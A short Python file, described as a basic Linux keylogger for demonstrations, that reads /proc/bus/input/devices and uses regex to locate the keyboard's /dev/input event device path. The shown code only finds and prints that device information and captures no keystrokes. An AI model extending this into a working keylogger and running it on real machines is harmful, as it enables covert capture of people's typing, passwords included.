import re

"""
Basic keylogger program using regex, file IO and linux event handlers.
Program compiled with XYZ for ease of use in demonstrations.
Written by mowemcfc (jcartermcfc@gmail.com) starting 12/06/2020
"""

with open("/proc/bus/input/devices") as f: # this file contains current device information, including the keyboard
    lines = f.readlines()

    pattern  = re.compile("Handlers|EV=")
    handlers = list(filter(pattern.search, lines))

    pattern = re.compile("EV=120013")


    for idx, elt in enumerate(handlers):
        if pattern.search(elt):
            line = handlers[idx-1]

    pattern = re.compile("event[0-9]")
    infile_path = "/dev/input/" + pattern.search(line).group(0)

    print(handlers)
    #print(handlers2)

    f.close()